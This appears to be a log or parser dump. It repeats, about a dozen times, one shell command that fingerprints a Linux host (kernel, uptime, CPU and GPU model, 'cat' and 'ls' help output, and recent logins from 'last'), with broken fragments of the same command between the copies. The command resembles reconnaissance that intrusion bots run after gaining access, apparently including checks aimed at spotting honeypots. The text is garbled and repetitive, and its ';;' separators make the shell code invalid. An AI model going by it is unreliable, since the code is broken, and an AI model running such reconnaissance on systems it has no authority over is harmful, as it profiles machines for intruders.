uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
